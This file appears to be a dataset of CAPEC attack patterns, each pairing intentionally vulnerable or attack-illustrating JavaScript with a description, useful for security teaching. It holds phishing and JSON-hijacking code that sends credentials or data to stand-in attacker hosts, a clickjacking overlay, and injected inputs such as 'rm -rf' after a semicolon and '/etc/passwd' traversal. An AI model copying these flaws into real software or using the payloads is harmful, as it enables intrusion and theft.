        "description": "A vulnerable configuration file parser that accepts and executes commands from JSON files without proper validation. It demonstrates multiple vulnerabilities including command injection (CWE-77), resource injection (CWE-99), and missing integrity checks (CWE-353). The code blindly trusts and executes external configuration files and their commands without verifying their origin or contents, allowing an attacker to inject malicious commands or include unauthorized configuration files."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/download', (req, res) => {\n  const userProvidedPath = req.query.filepath;\n  const filePath = './documents/' + userProvidedPath;\n\n  try {\n    const fileContent = fs.readFileSync(filePath);\n    res.send(fileContent);\n  } catch(err) {\n    res.status(404).send('File not found');\n  }\n});",
        "description": "This vulnerable code allows path traversal by directly concatenating user input into a file path without sanitization. An attacker can use '../' sequences to access files outside the intended directory, potentially exposing sensitive system files through endpoints like '/download?filepath=../../../../etc/passwd'."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "// Server-side configuration object\nlet config = {\n    isAdmin: false,\n    debugMode: false\n};\n\n// Vulnerable endpoint handling user parameters\napp.get('/api/setConfig', (req, res) => {\n    const userParams = req.query;\n    \n    // Vulnerable merge of user parameters into config\n    Object.assign(config, userParams);\n    \n    if(config.debugMode) {\n        // Vulnerable eval of user-supplied debug commands\n        eval(req.query.debugCommand);\n    }\n    \n    if(config.isAdmin) {\n        // Access granted without proper authentication\n        executeAdminFunction();\n    }\n});",
        "description": "This code demonstrates a vulnerable configuration management system where user-supplied parameters can override critical system settings. The code allows direct manipulation of configuration objects through query parameters without validation, enables code injection through eval() in debug mode, and contains an authentication bypass through parameter pollution."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "function processFilePath(userPath) {\n  // Vulnerable path validation that checks before decoding\n  if (!userPath.includes('../')) {\n    // Decode the path after validation\n    let decodedPath = decodeURIComponent(userPath);\n    // Construct file path without proper encoding handling\n    let filePath = '/var/www/files/' + decodedPath;\n    // Read file content without proper sanitization\n    return require('fs').readFileSync(filePath);\n  }\n  return false;\n}\n\n// Example exploitation:\n// processFilePath('%2E%2E%2F%2E%2E%2Fetc%2Fpasswd')",
        "description": "This code demonstrates a vulnerable file path handler that incorrectly validates input before decoding, allowing path traversal through URL encoding. The code fails to properly handle alternate encodings of special characters (particularly backslashes and dots), enabling an attacker to bypass the '../' check through URL encoding and potentially access files outside the intended directory."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "function accessFile(userInput) {\n    const base = '/var/www/files/';\n    const path = base + userInput;\n    \n    // Vulnerable validation - only checks for '../' but not '..\\\\'    \n    if (path.indexOf('../') !== -1) {\n        return 'Access denied';\n    }\n    \n    // Doesn't normalize path before access\n    const fileContent = readFileSync(path);\n    return fileContent;\n}",
        "description": "A vulnerable file access function that fails to properly handle alternate path encodings. It only checks for forward slashes in directory traversal attempts while ignoring backslashes, allowing attackers to bypass the security check using Windows-style paths. The function also lacks proper path canonicalization and fails to validate the final resolved path."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "`function validateFileName(userInput) {\n    // Naive UTF-8 validation and filtering\n    const illegalChars = /[<>:\"/\\\\|?*]/g;\n    \n    // Incorrect validation order - validates before decoding\n    if (!illegalChars.test(userInput)) {\n        // Decode UTF-8 input without proper length checks\n        const decodedInput = decodeURIComponent(escape(userInput));\n        \n        // Vulnerable path construction without proper encoding checks\n        const filePath = './uploads/' + decodedInput;\n        \n        // Process the file path\n        return filePath;",
        "description": "\"This code demonstrates vulnerable handling of UTF-8 encoded input in a file path validation scenario. It performs validation before decoding, fails to properly handle alternate encodings, and doesn't account for overlong UTF-8 sequences. This allows attackers to bypass security checks using specially crafted UTF-8 encodings to potentially access unauthorized files.\""
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "`\n    const fs = require('fs');\n    const logFile = '/var/log/webapp.log';\n\n    function logUserActivity(userId, action) {\n        const userInput = userId + ' ' + action;\n        const timestamp = new Date().toISOString();\n        const logEntry = timestamp + ' - ' + userInput + '\\\\n';\n        \n        try {\n            fs.appendFileSync(logFile, logEntry);",
        "description": "\"This vulnerable code demonstrates log tampering by failing to sanitize user input before writing to log files. It allows injection of CRLF sequences and special characters that can manipulate log structure and potentially hide malicious activities. The code also lacks proper permissions checks and input validation, making it susceptible to log poisoning attacks.\""
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "`\n    const express = require('express');\n    const xml2js = require('xml2js');\n    const app = express();\n\n    app.post('/process-xml', (req, res) => {\n        const xmlData = req.body;\n        const parser = new xml2js.Parser({\n            explicitArray: false,\n            async: true,\n            explicitRoot: false,\n            resolveEntities: true,\n            allowDTD: true",
        "description": "\"This vulnerable code accepts XML data without proper validation, allowing potential XML injection, entity expansion attacks, and external entity references. It uses unsafe parser configurations that enable DTD processing and entity resolution, making it susceptible to XXE attacks and XML bomb attacks through recursive entity expansion. The code also directly stores the parsed XML without sanitization or schema validation.\""
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "function authenticateUser(username, password) {\n  const xmlDoc = loadXMLDoc('users.xml');\n  const xpath = \"//users/user[username/text()='\" + username + \"' and password/text()='\" + password + \"']\";\n  const result = xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE, null);\n  return result.iterateNext() !== null;\n}",
        "description": "This code demonstrates a vulnerable authentication function that directly concatenates user input into an XPath query without sanitization. An attacker could inject malicious XPath expressions in the username or password fields to bypass authentication or extract sensitive data from the XML database."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xpath = require('xpath');\nconst dom = require('xmldom').DOMParser;\n\napp.get('/search', (req, res) => {\n  const userInput = req.query.term;\n  const xmlData = `\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <users>\n      <user>\n        <name>John</name>\n        <role>admin</role>\n      </user>\n      <user>\n        <name>Alice</name>\n        <role>user</role>\n      </user>\n    </users>\n  `;\n  \n  const doc = new dom().parseFromString(xmlData);\n  const query = `//user[name='${userInput}']`;\n  const nodes = xpath.select(query, doc);\n  \n  res.json({ results: nodes });\n});",
        "description": "This code demonstrates an XQuery/XPath injection vulnerability where user input is directly embedded into an XPath query without proper sanitization. An attacker could input malicious values like ' or '1'='1 to retrieve unauthorized data from the XML document. The code processes XML data using externally-influenced input to construct the query expression, making it susceptible to injection attacks."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "function scanSystem() {\n    const targets = [\n        '/admin',\n        '/login',\n        '/api',\n        '/config'\n    ];\n    \n    const results = {};\n    \n    targets.forEach(target => {\n        $.ajax({\n            url: target,\n            method: 'GET',\n            data: { payload: '<script>alert(1)</script>' },\n            success: function(response) {\n                results[target] = {\n                    exists: true,\n                    content: response,\n                    xssVulnerable: response.includes(this.data.payload)\n                };\n                document.write(response);\n            },\n            error: function(xhr) {\n                results[target] = {\n                    exists: xhr.status !== 404,\n                    headers: xhr.getAllResponseHeaders()\n                };\n            },\n            async: false\n        });\n    });\n    \n    return JSON.stringify(results);\n}",
        "description": "This vulnerable code demonstrates rapid Ajax scanning by making multiple synchronous requests to potential sensitive endpoints. It includes unvalidated input injection, doesn't sanitize responses, and writes responses directly to DOM. The code attempts fingerprinting through error responses and header information, while testing for XSS vulnerabilities simultaneously."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "app.get('/profile', function(req, res) {\n    let userTitle = req.query.title || 'Guest';\n    let userAgent = req.headers['user-agent'];\n    let referer = req.headers['referer'];\n    \n    res.setHeader('X-Custom-Header', userTitle);\n    \n    let htmlContent = `\n        <h1>Welcome ${userTitle}</h1>\n        <img src=\"profile.jpg\" title=\"${userAgent}\">\n        <div>Last visited from: ${referer}</div>\n    `;\n    \n    res.send(htmlContent);\n})",
        "description": "This code demonstrates multiple XSS vulnerabilities through unvalidated input in HTTP headers and HTML content. It directly injects user-controlled data from query parameters and HTTP headers into both the response headers and HTML content without proper sanitization. The code is vulnerable to XSS through the Custom-Header, HTML content, and IMG tag attributes."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "// Simple Express.js route handler\napp.get('/admin/users', (req, res) => {\n    // Missing proper authentication check\n    if(req.query.role === 'admin') {\n        // Sensitive data exposed via GET query parameter\n        const userData = getUserData(req.query.userId);\n        res.json(userData);\n    } else {\n        res.redirect('/login');\n    }\n});\n\n// Vulnerable file access endpoint\napp.get('/download/:filename', (req, res) => {\n    // No validation of file path or user authorization\n    const filePath = './documents/' + req.params.filename;\n    res.sendFile(filePath);\n});",
        "description": "This code demonstrates multiple vulnerabilities related to forced browsing. It lacks proper authentication checks, exposes sensitive data through GET parameters, and allows direct access to files without proper authorization. The admin route can be accessed by simply manipulating query parameters, and the download endpoint allows unrestricted access to files through direct URL manipulation."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "const executeCommand = (userInput) => {\n    const childProcess = require('child_process');\n    let command = 'dir ' + userInput;\n    // Directly using user input in system command\n    childProcess.exec(command, (error, stdout, stderr) => {\n        console.log(stdout);\n    });\n};\n\n// Example usage\nconst userProvidedPath = '../user_files; rm -rf /important_files';\nexecuteCommand(userProvidedPath);",
        "description": "This code demonstrates OS command injection vulnerability by directly concatenating unvalidated user input into a system command executed via child_process.exec(). The code fails to sanitize special characters or validate input, allowing attackers to inject arbitrary OS commands after the semicolon."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "// Simulated DNS poisoning and fake banking site\nconst dns = {\n    'www.legitimate-bank.com': '10.0.0.99'  // Attacker's IP\n};\n\nfunction dnsLookup(domain) {\n    return dns[domain] || null;\n}\n\nfunction handleBankLogin() {\n    const domain = 'www.legitimate-bank.com';\n    const serverIP = dnsLookup(domain);\n    \n    // No validation of DNS response integrity\n    const loginForm = `\n        <form action='http://${serverIP}/login' method='POST'>\n            <input type='text' name='username'>\n            <input type='password' name='password'>\n            <input type='submit' value='Login'>\n        </form>\n    `;\n    \n    document.getElementById('loginContainer').innerHTML = loginForm;\n}",
        "description": "This code demonstrates a pharming vulnerability by simulating DNS poisoning where a banking website's domain is mapped to an attacker's IP. The code fails to validate DNS responses, blindly trusts reverse DNS lookups, and directly injects potentially malicious content into the DOM. It lacks proper origin validation and integrity checks when loading external resources."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "`\nconst authenticateUser = (username, challenge) => {\n  const clientChallenge = challenge;\n  const serverResponse = sendAuthChallenge(clientChallenge);\n  \n  function sendAuthChallenge(challenge) {\n    // Vulnerable: Same challenge-response mechanism for both client and server\n    return generateResponse(challenge, 'secret_key');",
        "description": "\"A vulnerable authentication implementation using a simple challenge-response mechanism that's susceptible to reflection attacks. The code uses the same challenge-response logic for both client and server sides, making it vulnerable to replay attacks. An attacker can capture the server's challenge and reflect it back, bypassing authentication without knowing the secret key. The implementation lacks nonce values, timestamps, or session-specific data to prevent replay attacks.\""
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "function displayUserImage(imageUrl) {\n  const imageElement = document.createElement('img');\n  imageElement.src = imageUrl; // Vulnerable to XSS via src attribute\n  document.body.appendChild(imageElement);\n}\n\nfunction processUserContent(content) {\n  // Incomplete sanitization of user input\n  content = content.replace('<script>', '');\n  content = content.replace('</script>', '');\n  \n  // Creates IMG tag directly from user input\n  const element = document.getElementById('content');\n  element.innerHTML = `<img src='${content}' onerror='alert(1)'/>`;\n}",
        "description": "This code is vulnerable to XSS through insufficient sanitization of user input in IMG tag attributes. It demonstrates improper handling of script-related elements, incomplete denylisting, and vulnerability to alternate XSS syntax in image source attributes."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "function processUserData(data) {\n  let size = data.length;\n  let buffer = new Array(size);\n  \n  // Vulnerable to integer overflow\n  size = size + 1000000000;\n  \n  // Allocate memory based on potentially overflowed size\n  let newBuffer = new Array(size);\n  \n  // Copy data without proper bounds checking\n  for(let i = 0; i <= size; i++) {\n    newBuffer[i] = data[i];\n  }\n  \n  return newBuffer;\n}",
        "description": "A vulnerable function that performs unsafe integer arithmetic and buffer operations. It adds a large value to a user-controlled size variable without checking for overflow, then uses this potentially overflowed value for memory allocation and buffer copying operations without proper bounds checking. This can lead to heap corruption and buffer overflows when the size variable wraps around to a small or negative value."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "const logActivity = (username, action) => {\n    const logEntry = `${username} performed ${action} at ${new Date()}`;\n    // Logging without sanitization or validation\n    fs.appendFileSync('audit.log', logEntry + '\\n');\n\n    if(action.includes('payment')) {\n        // Logging sensitive payment data without filtering\n        const paymentDetails = {\n            cardNumber: '4111-1111-1111-1111',\n            cvv: '123',\n            amount: 1000\n        };\n        fs.appendFileSync('payment.log', JSON.stringify(paymentDetails) + '\\n');\n    }\n};\n\n// Vulnerable usage\nlogActivity(userInput, 'login\\n\\nDELETE FROM users;--');",
        "description": "This code demonstrates multiple logging vulnerabilities including lack of input sanitization allowing log injection, excessive logging of sensitive data, and improper handling of special characters in log entries. The code logs user input directly without sanitization, allowing injection of newlines and malicious content, while also logging sensitive payment information in plaintext."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "`\nconst https = require('https');\nconst fs = require('fs');\n\n// Vulnerable SSL/TLS implementation\nconst sslContext = {\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt'),\n  rejectUnauthorized: false  // Disables certificate validation",
        "description": "\"This code demonstrates multiple authentication vulnerabilities including improper SSL/TLS configuration, weak token validation, and modification of SSL context after connection creation. It lacks proper endpoint verification and is susceptible to replay attacks since there's no mechanism to validate token freshness or prevent token reuse.\""
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "`\n    // Vulnerable WSDL service configuration\n    const soap = require('soap');\n    const express = require('express');\n    const app = express();\n\n    // Sensitive WSDL service with exposed implementation details\n    const wsdlService = {\n      MyService: {\n        MyPort: {\n          processData: function(args) {\n            const dbConnection = 'mysql://admin:password123@localhost/userdata';\n            const systemInfo = {\n              os: process.platform,\n              version: process.version,\n              paths: process.env.PATH,\n              adminKey: process.env.ADMIN_KEY",
        "description": "\"This code demonstrates a vulnerable SOAP web service implementation that exposes sensitive system information through its WSDL interface. It includes sensitive connection strings, system details, and environment variables in the service response, while also making the WSDL file publicly accessible. The service uses GET requests with sensitive query parameters and lacks proper access controls for the WSDL file access.\""
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "try {\n  // Using a non-standard or platform-specific API\n  const userInput = document.getElementById('input').value;\n  const buffer = new ArrayBuffer(16);\n  const view = new Int32Array(buffer);\n  \n  // Blocking operation in single-threaded context\n  const result = synchronousFileRead('/path/to/external/lib.dll');\n  \n  // Potentially dangerous dynamic library loading\n  const externalLib = require(userInput + '.dll');\n  \n  // Unsafe memory operations\n  for (let i = 0; i <= view.length; i++) {\n    view[i] = externalLib.processData(result[i]);\n  }\n} catch(e) {\n  // Poor error handling that might leave system in insecure state\n  console.log('Error occurred');\n  continue;\n}",
        "description": "This code demonstrates multiple vulnerabilities related to unsafe library usage: it uses platform-specific APIs without proper checks, performs blocking operations in a single-threaded context, dynamically loads libraries based on user input, and contains an out-of-bounds memory access. The error handling is insufficient and might leave the system in an vulnerable state."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n    // Using a weak static key and predictable IV\n    const key = 'mysecretkey123456';\n    const iv = Buffer.from('1234567890123456');\n    \n    // Using deprecated algorithm\n    const cipher = crypto.createCipheriv('des-cbc', key, iv);\n    \n    // Not checking if crypto is ready\n    let encrypted = cipher.update(data, 'utf8', 'hex');\n    encrypted += cipher.final('hex');\n    \n    return encrypted;\n}\n\nfunction generateRandomNumber() {\n    // Using predictable Math.random() instead of cryptographically secure random\n    return Math.floor(Math.random() * 1000000);\n}\n\nconst sensitiveData = 'secret_password';\nconsole.log(encryptData(sensitiveData));",
        "description": "This code demonstrates multiple cryptographic vulnerabilities including: use of a weak static encryption key, predictable IV, deprecated DES algorithm, lack of crypto-readiness checks, and use of non-cryptographic random number generation. These weaknesses make the encryption susceptible to cryptanalysis attacks including total break and information deduction."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "function createFakeLoginForm() {\n    const overlay = document.createElement('div');\n    overlay.style.position = 'fixed';\n    overlay.style.top = '0';\n    overlay.style.width = '100%';\n    overlay.innerHTML = `\n        <div style='background: white; padding: 20px;'>\n            <img src='https://legitimate-bank.com/logo.png'>\n            <h2>Security Verification Required</h2>\n            <form id='securityForm' action='https://malicious-site.com/collect'>\n                <input type='text' placeholder='Username' name='user'>\n                <input type='password' placeholder='Password' name='pass'>\n                <button type='submit'>Verify Account</button>\n            </form>\n        </div>`;\n    document.body.appendChild(overlay);\n    \n    const form = overlay.querySelector('#securityForm');\n    form.onsubmit = function(e) {\n        e.preventDefault();\n        const data = new FormData(form);\n        fetch('https://malicious-site.com/collect', {\n            method: 'POST',\n            body: data\n        });\n        window.location = 'https://legitimate-bank.com';\n    };\n}",
        "description": "This code creates a deceptive overlay that mimics a legitimate bank's security verification form. It intercepts user credentials and sends them to a malicious server before redirecting to the legitimate site. The code demonstrates UI misrepresentation (CWE-451), malicious redirection (CWE-601), and embedded malicious code (CWE-506) characteristics of a phishing attack."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "`\n    const express = require('express');\n    const xml2js = require('xml2js');\n    const app = express();\n\n    app.post('/process-xml', (req, res) => {\n      const xmlData = req.body.xml;\n      \n      // Vulnerable XML processing without validation\n      const parser = new xml2js.Parser({\n        explicitArray: false,\n        async: true,\n        explicitRoot: false,\n        resolveEntities: true,\n        xmlEntities: true",
        "description": "\"This code demonstrates multiple XML-related vulnerabilities including XML injection, missing XML schema validation, and unsafe external entity processing. The server accepts raw XML data without proper validation or sanitization, processes XML entities without restrictions, and constructs XPath queries using unsanitized input, making it vulnerable to XXE attacks and XML injection.\""
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "function copyUserInput(input) {\n    let buffer = new Array(10);\n    // Vulnerable: No bounds checking on input length\n    for(let i = 0; i < input.length; i++) {\n        buffer[i] = input[i];  // Can write beyond buffer bounds\n    }\n    return buffer;\n}\n\n// Example usage with buffer overflow\nlet userInput = new Array(20).fill('A');\nlet result = copyUserInput(userInput);",
        "description": "This code demonstrates a classic buffer overflow vulnerability where a fixed-size buffer (10 elements) is used to store user input without proper bounds checking. The loop copies elements from the input array to the buffer without verifying if the input length exceeds the buffer's capacity, potentially causing a buffer overflow when input length is greater than 10."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/page', (req, res) => {\n    let userInput = req.query.content;\n    // Vulnerable: directly embedding user input into SSI template\n    let template = `<!--#include virtual=\"${userInput}\" -->`;\n    res.send(template);\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "description": "This code demonstrates a vulnerable implementation that allows Server-Side Include (SSI) injection by directly embedding user-provided input into an SSI directive without proper validation or sanitization. An attacker could exploit this by providing malicious paths or commands in the 'content' parameter."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "// Server-side code\nconst express = require('express');\nconst app = express();\n\napp.use(session({\n  secret: 'sessionSecret',\n  cookie: {\n    httpOnly: false,     // Allows JavaScript access to cookies\n    secure: false,       // Doesn't require HTTPS\n    maxAge: 24 * 60 * 60 * 1000\n  }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  \n  // Validate credentials and create session\n  if(validateUser(username, password)) {\n    req.session.userToken = generateToken();\n    req.session.userId = username;\n    \n    // Send session token in plaintext\n    res.cookie('sessionId', req.session.userToken);\n    res.redirect('/dashboard');\n  }\n});\n\napp.get('/api/userData', (req, res) => {\n  // No HTTPS requirement for sensitive data\n  if(req.cookies.sessionId) {\n    const userData = getUserData(req.cookies.sessionId);\n    res.json(userData);\n  }\n});",
        "description": "This vulnerable code demonstrates session sidejacking vulnerability by implementing a session management system that transmits session tokens in plaintext, doesn't enforce HTTPS, and sets cookies without secure attributes. The session token is exposed to network sniffing and can be captured and replayed by attackers."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "// Malicious site code\nconst overlay = document.createElement('div');\noverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:999999';\n\nconst fakeButton = document.createElement('button');\nfakeButton.style.cssText = 'position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)';\nfakeButton.textContent = 'Click here to continue';\n\noverlay.appendChild(fakeButton);\ndocument.body.appendChild(overlay);\n\noverlay.addEventListener('click', function(e) {\n    // The click actually triggers action on a hidden iframe\n    const hiddenFrame = document.createElement('iframe');\n    hiddenFrame.style.display = 'none';\n    hiddenFrame.src = 'https://legitimate-site.com/delete-account';\n    document.body.appendChild(hiddenFrame);\n    \n    // Create illusion of intended action\n    alert('Thank you for confirming!');\n});",
        "description": "This code creates an almost invisible overlay on top of a legitimate website with a hidden button. When users think they're interacting with the legitimate site, their clicks are actually intercepted by the overlay and trigger unintended actions in a hidden iframe pointing to the legitimate site, potentially executing destructive operations using the user's active session."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "function loadExternalScript(url) {\n    let script = document.createElement('script');\n    script.src = url;\n    script.setAttribute('data-zone', 'trusted');\n    \n    // Bypass security checks with elevated privileges\n    const originalPolicy = document.policy;\n    document.policy = null;\n    \n    // No input validation or sanitization\n    script.innerHTML = decodeURIComponent(location.hash.substring(1));\n    \n    // Execute with elevated privileges without proper checks\n    if(script.getAttribute('data-zone') === 'trusted') {\n        document.getElementsByTagName('head')[0].appendChild(script);\n        eval(script.innerHTML);\n    }\n    \n    document.policy = originalPolicy;\n}",
        "description": "This code demonstrates a vulnerable script loader that bypasses browser security zones and executes untrusted content with elevated privileges. It lacks proper input validation, authorization checks, and content encoding, allowing arbitrary script execution through URL parameters."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "`\nconst http = require('http');\nconst proxy = http.createServer((req, res) => {\n  let headers = req.headers;\n  let contentLength = headers['content-length'];\n  let transferEncoding = headers['transfer-encoding'];\n  \n  // Vulnerable: Doesn't properly validate or sanitize headers\n  let forwardRequest = {\n    host: 'backend-server',\n    port: 8080,\n    path: req.url,\n    method: req.method,\n    headers: {\n      'Content-Length': contentLength,\n      'Transfer-Encoding': transferEncoding",
        "description": "\"This code demonstrates a vulnerable HTTP proxy implementation that fails to properly validate and sanitize HTTP headers, making it susceptible to HTTP Request Smuggling attacks. The code blindly forwards Content-Length and Transfer-Encoding headers without checking for conflicts or malformed values, allowing an attacker to potentially exploit parsing discrepancies between the proxy and backend server.\""
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "function logUserActivity(userInput) {\n    // Incomplete denylist for XSS protection\n    const blacklist = ['<script>', 'javascript:', 'onerror='];\n    let sanitizedInput = userInput;\n    \n    blacklist.forEach(term => {\n        sanitizedInput = sanitizedInput.replace(term, '');\n    });\n    \n    // Vulnerable logging implementation\n    console.log('User activity: ' + sanitizedInput);\n    \n    // Vulnerable HTML output with user input in IMG tag\n    document.getElementById('output').innerHTML = \n        `<img src=\"${sanitizedInput}\" alt=\"user image\">`;\n}",
        "description": "Code demonstrates multiple vulnerabilities: inadequate XSS protection through incomplete denylist, unsafe logging of user input, and improper sanitization of IMG tag attributes. Attacker can bypass protection using XSS variants like '><img src=x oNeRrOr=alert(1)>' or manipulate log entries with malicious payloads."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "// Server-side JavaScript code\napp.use((req, res, next) => {\n    // Incorrectly allowing TRACE method\n    if (req.method === 'TRACE') {\n        // Echoing back all request headers including cookies\n        res.setHeader('Content-Type', 'message/http');\n        let requestDump = `${req.method} ${req.url} HTTP/1.1\\n`;\n        for (let header in req.headers) {\n            requestDump += `${header}: ${req.headers[header]}\\n`;\n        }\n        res.send(requestDump);\n    } else {\n        next();\n    }\n});\n\n// Client-side exploit\nlet xst = new XMLHttpRequest();\nxst.open('TRACE', 'https://vulnerable-site.com', true);\nxst.withCredentials = true;\nxst.onload = function() {\n    // Attacker can now see all headers including cookies\n    console.log(this.responseText);\n};\nxst.send();",
        "description": "This code demonstrates a vulnerable implementation that allows Cross-Site Tracing (XST) by failing to disable the HTTP TRACE method. The server-side code echoes back all request headers, including sensitive cookies, while the client-side code shows how an attacker could exploit this to steal session information. The code fails to implement proper protection mechanisms (CWE-693), incorrectly handles privileged operations (CWE-648), and enables cross-site attacks (CWE-79, CWE-352)."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst { exec } = require('child_process');\n\nconst app = express();\nconst db = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password',\n    database: 'userdb'\n});\n\napp.get('/process-command', (req, res) => {\n    const userId = req.query.id;\n    \n    // Vulnerable SQL query that could allow injection\n    const query = `SELECT command FROM user_commands WHERE user_id = ${userId}`;\n    \n    db.query(query, (err, result) => {\n        if (result && result[0]) {\n            // Vulnerable command execution using stored data\n            exec(result[0].command, (error, stdout, stderr) => {\n                res.send(stdout);\n            });\n        }\n    });\n});",
        "description": "This code demonstrates a vulnerable implementation where user input is directly interpolated into an SQL query without sanitization, allowing SQL injection. The injected malicious command is then stored in the database. Later, when fetched, this command is executed directly through child_process.exec without validation, enabling command injection attacks."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "const Sequelize = require('sequelize');\nconst sequelize = new Sequelize('database', 'user', 'password');\n\nconst User = sequelize.define('user', {\n    username: Sequelize.STRING,\n    email: Sequelize.STRING\n});\n\nasync function findUserByUsername(userInput) {\n    // Vulnerable: Raw query with unvalidated user input\n    const users = await sequelize.query(\n        `SELECT * FROM users WHERE username = '${userInput}'`,\n        { type: Sequelize.QueryTypes.SELECT }\n    );\n    return users;\n}",
        "description": "This code demonstrates a vulnerable implementation using Sequelize ORM where user input is directly interpolated into a raw SQL query without proper validation or parameterization. Instead of using Sequelize's safe query methods, it uses a raw query with string concatenation, making it susceptible to SQL injection attacks."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst soapServer = soap.createServer({\n    UserService: {\n        UserPort: {\n            getUserDetails: function(args) {\n                const connection = mysql.createConnection({\n                    host: 'localhost',\n                    user: 'admin',\n                    password: 'password',\n                    database: 'userdb'\n                });\n                \n                // Vulnerable SQL query construction using SOAP parameters\n                const query = `SELECT * FROM users WHERE username = '${args.username}' AND password = '${args.password}'`;\n                \n                connection.query(query, function(error, results) {\n                    if (error) {\n                        // Leaks error details\n                        console.error('Database error:', error.message);\n                        return { error: error.message };\n                    }\n                    return { user: results[0] };\n                });\n            }\n        }\n    }\n});",
        "description": "This code demonstrates a vulnerable SOAP web service implementation that processes user credentials without proper input validation or parameterized queries. It directly interpolates user-supplied values from SOAP message parameters into a SQL query string, making it susceptible to SQL injection attacks. Additionally, it exposes sensitive error messages to clients."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "// Vulnerable server endpoint\napp.get('/api/userData', function(req, res) {\n    const userData = getUserData();\n    // No origin validation or CSRF protection\n    res.json(userData);\n});\n\n// Malicious website code\n<script>\n    function stealData() {\n        var script = document.createElement('script');\n        script.src = 'http://legitimate-site.com/api/userData?callback=processData';\n        document.body.appendChild(script);\n    }\n\n    function processData(data) {\n        // Send stolen data to attacker's server\n        fetch('http://attacker.com/collect', {\n            method: 'POST',\n            body: JSON.stringify(data)\n        });\n    }\n\n    stealData();\n</script>",
        "description": "This code demonstrates a JSON hijacking vulnerability where the server endpoint returns sensitive JSON data without proper origin validation or CSRF protection. The malicious script uses JSONP technique to bypass Same Origin Policy and steal data by injecting a script tag that loads the target API endpoint. The stolen data is then forwarded to the attacker's server."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "function authenticateUser(username, password) {\n    const storedHash = '5f4dcc3b5aa765d61d8327deb882cf99';\n    let attempts = 0;\n    \n    // Simple 4-digit PIN generator\n    function generatePin() {\n        return Math.floor(Math.random() * 10000);\n    }\n    \n    // Weak password hashing\n    function simpleHash(input) {\n        let hash = 0;\n        for(let i = 0; i < input.length; i++) {\n            hash += input.charCodeAt(i);\n        }\n        return hash.toString(16);\n    }\n    \n    // No rate limiting on login attempts\n    while(simpleHash(password) !== storedHash) {\n        password = generatePin().toString();\n        attempts++;\n        if(attempts === 10000) {\n            console.log('Access granted: ' + password);\n            return true;\n        }\n    }\n    return false;\n}",
